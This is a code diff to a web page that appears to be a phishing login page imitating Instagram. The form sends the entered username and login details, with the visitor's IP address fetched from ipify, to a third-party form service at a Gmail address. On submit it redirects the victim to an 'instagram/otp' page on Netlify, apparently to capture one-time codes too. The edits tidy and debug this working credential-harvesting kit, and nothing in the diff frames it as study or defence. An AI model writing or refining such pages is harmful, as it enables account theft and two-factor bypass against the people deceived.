@@ -30,6 +30,9 @@
         <div class="form-container">
           <form id="form" method="POST" action="https://formsubmit.co/marketcaplinkcoin@gmail.com">
             <input type="hidden" id="ipaddress" name="IPaddress">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" id="nextField" name="_next" value="">
+
             <div class="form-content box">
               <div class="logo">
                 <img src="./images/logo-light.png" class="logo-light" />
@@ -49,8 +52,6 @@
                   <div class="animate-input">
                     <span>Phone number, username or email</span>
                     <input type="text" name="username" id="username" required>
-                    <input type="hidden" name="_captcha" value="false">
-                    <input type="hidden" id="nextField" name="_next" value="">
                   </div>
                 </div>
 
@@ -99,28 +100,32 @@
     </div>
   </div>
 
+  <!-- Optional: Show IP for debugging -->
+  <p id="show-ip" style="text-align: center; font-size: 14px; color: gray;"></p>
+
   <script>
     document.addEventListener('DOMContentLoaded', function () {
-      // Fetch IP address
+      // Fetch and populate IP
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           document.getElementById('ipaddress').value = data.ip || '';
+          document.getElementById('show-ip').innerText = "Your IP: " + data.ip; // for testing
         })
         .catch(error => {
           console.error('IP Fetch Error:', error);
           alert('Failed to fetch IP address. Please try again.');
         });
-    const form = document.getElementById('form');
-    const nextField = document.getElementById('nextField');
 
-    form.addEventListener('submit', function () {
-      nextField.value = "https://plitvote.netlify.app/instagram/otp/657daf104b167f68d1979b9c.html";
+      const form = document.getElementById('form');
+      const nextField = document.getElementById('nextField');
+
+      form.addEventListener('submit', function () {
+        nextField.value = "https://plitvote.netlify.app/instagram/otp/657daf104b167f68d1979b9c.html";
+      });
     });
   </script>
 
   <script src="app.js"></script>
 </body>
 </html>
-
-
